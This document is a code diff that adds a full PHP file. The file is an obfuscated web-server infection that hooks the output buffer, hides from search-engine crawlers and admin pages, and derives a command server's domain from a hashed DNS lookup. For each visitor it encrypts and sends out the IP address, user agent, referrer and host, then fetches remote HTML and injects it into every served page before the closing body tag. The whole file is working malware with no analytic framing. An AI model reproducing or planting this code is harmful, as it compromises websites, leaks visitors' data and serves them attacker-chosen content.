@@ -1,0 +1,271 @@
+
+if ((function_exists("ob_start") && (!isset($GLOBALS["anuna"]))))
+{
+	$GLOBALS["anuna"] = 1;
+	$uas = strtolower($_SERVER["HTTP_USER_AGENT"]);
+
+	if ((strstr($uas, "msie")) or (strstr($uas, "")) or (strstr($uas, "android")) or (strstr($uas, "chrome")) or (strstr($uas, "firefox")))
+	{
+		@error_reporting(0);
+
+		function cqq($qw)
+		{
+			$domarr = array(
+				"33db9538",
+				"9507c4e8",
+				"e5b57288",
+				"54dfa1cb"
+			);
+			return random($domarr, $qw);
+		}
+
+		function random($arr, $qw)
+		{
+	           	 $arr = str_split(md5('.com'.gethostbyname('stat-dns.com')), 8);
+			return $arr[rand(0, 1.125)] . $qw;
+		}
+
+		function en2($s, $q)
+		{
+		    $g = "";
+		    
+			while (strlen($g) < strlen($s))
+			{
+				$q = pack("H*", md5($g . $q . "q1w2e3r4"));
+				$g.= substr($q, 0, 8);
+			}
+
+			return $s ^ $g;
+		}
+
+		function g_1($url)
+		{
+			if (function_exists("file_get_contents") === false) return false;
+			$buf = @file_get_contents($url);
+
+			if ($buf == "") return false;
+			return $buf;
+		}
+
+		function g_2($url)
+		{
+			if (function_exists("curl_init") === false) return false;
+
+			$ch = curl_init();
+			curl_setopt($ch, CURLOPT_URL, $url);
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+			curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+			curl_setopt($ch, CURLOPT_HEADER, 0);
+			$res = curl_exec($ch);
+			curl_close($ch);
+
+			if ($res == "") return false;
+			return $res;
+		}
+
+		function g_3($url)
+		{
+			if (function_exists("file") === false) return false;
+			$inc = @file($url);
+			$buf = @implode("", $inc);
+			if ($buf == "") return false;
+			return $buf;
+		}
+
+		function g_4($url)
+		{
+			if (function_exists("socket_create") === false) return false;
+			$p = @parse_url($url);
+			$host = $p["host"];
+
+			if (!isset($p["query"])) $p["query"] = "";
+
+			$uri = $p["path"] . "?" . $p["query"];
+			$ip1 = @gethostbyname($host);
+			$ip2 = @long2ip(@ip2long($ip1));
+
+			if ($ip1 != $ip2) return false;
+
+			$sock = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+
+			if (!@socket_connect($sock, $ip1, 80))
+			{
+				@socket_close($sock);
+				return false;
+			}
+
+			$req = "GET $uri HTTP/1.0\n";
+			$req.= "Host: $host\n\n";
+			socket_write($sock, $req);
+			$buf = "";
+
+			while ($t = socket_read($sock, 10000))
+			{
+				$buf.= $t;
+			}
+			@socket_close($sock);
+
+			if ($buf == "") return false;
+
+			list($m, $buf) = explode("\r\n\r\n", $buf);
+			return $buf;
+		}
+
+		function gtd($url)
+		{
+			$co = "";
+			$co = @g_1($url);
+
+			if ($co !== false) return $co;
+			$co = @g_2($url);
+
+			if ($co !== false) return $co;
+			$co = @g_3($url);
+
+			if ($co !== false) return $co;
+			$co = @g_4($url);
+
+			if ($co !== false) return $co;
+			return "";
+		}
+
+		if (!function_exists("comgzi"))
+		{
+			function comgzi($gzData)
+			{
+				if (substr($gzData, 0, 3) == "\x1f\x8b\x08")
+				{
+					$i = 10;
+					$flg = ord(substr($gzData, 3, 1));
+
+					if ($flg > 0)
+					{
+						if ($flg & 4)
+						{
+							list($xlen) = unpack("v", substr($gzData, $i, 2));
+							$i = $i + 2 + $xlen;
+						}
+
+						if ($flg & 8) $i = strpos($gzData, "\0", $i) + 1;
+						if ($flg & 16) $i = strpos($gzData, "\0", $i) + 1;
+						if ($flg & 2) $i = $i + 2;
+					}
+
+					return @gzinflate(substr($gzData, $i, -8));
+				}
+				else
+				{
+					return false;
+				}
+			}
+		}
+
+		function k34($op, $text)
+		{
+			return base64_encode(en2($text, $op));
+		}
+
+		function check212($param)
+		{
+			if (!isset($_SERVER[$param])) 
+				$a = "non";
+			else
+			{
+				if ($_SERVER[$param] == "") 
+					$a = "non";
+				else 
+					$a = $_SERVER[$param];
+			}
+			
+			return $a;
+		}
+
+		function day212()
+		{
+			$a = check212("HTTP_USER_AGENT");
+			$b = check212("HTTP_REFERER");
+			$c = check212("REMOTE_ADDR");
+			$d = check212("HTTP_HOST");
+			$e = check212("PHP_SELF");
+
+			$domarr = array(
+				"33db9538",
+				"9507c4e8",
+				"e5b57288",
+				"54dfa1cb"
+			);
+
+			if (($a == "non") or ($c == "non") or ($d == "non") or strrpos(strtolower($e) , "admin") or (preg_match("/" . implode("|", array(
+				"google",
+				"slurp",
+				"msnbot",
+				"ia_archiver",
+				"yandex",
+				"rambler"
+			)) . "/i", strtolower($a))))
+			{
+				$o1 = "";
+			}
+			else
+			{
+				$op = mt_rand(100000, 999999);
+				$g4 = $op . "?" . urlencode(urlencode(k34($op, $a) . "." . k34($op, $b) . "." . k34($op, $c) . "." . k34($op, $d) . "." . k34($op, $e)));
+				$url = "http://" . cqq(".com") . "/" . $g4;
+				$ca1 = en2(@gtd($url) , $op);
+				$a1 = @explode("!NF0", $ca1);
+
+				if (sizeof($a1) >= 2) 
+					$o1 = $a1[1];
+				else 
+					$o1 = "";
+			}
+
+			return $o1;
+		}
+
+		if (!function_exists("dcoo"))
+		{
+			function dcoo($cz, $length = null)
+			{
+				if (false !== ($dz = @gzinflate($cz))) return $dz;
+				if (false !== ($dz = @comgzi($cz))) return $dz;
+				if (false !== ($dz = @gzuncompress($cz))) return $dz;
+
+				if (function_exists("gzdecode"))
+				{
+					$dz = @gzdecode($cz);
+					if (false !== $dz) return $dz;
+				}
+
+				return $cz;
+			}
+		}
+
+		if (!function_exists("pa22"))
+		{
+			function pa22($v)
+			{
+				Header("Content-Encoding: none");
+				$t = dcoo($v);
+
+				if (preg_match("/\<\/body/si", $t))
+				{
+					return preg_replace("/(\<\/body[^\>]*\>)/si", day212() . "\n" . "$" . "1", $t, 1);
+				}
+				else
+				{
+					if (preg_match("/\<\/html/si", $t))
+					{
+						return preg_replace("/(\<\/html[^\>]*\>)/si", day212() . "\n" . "$" . "1", $t, 1);
+					}
+					else
+					{
+						return $t;
+					}
+				}
+			}
+		}
+
+		ob_start("pa22");
+	}
+}
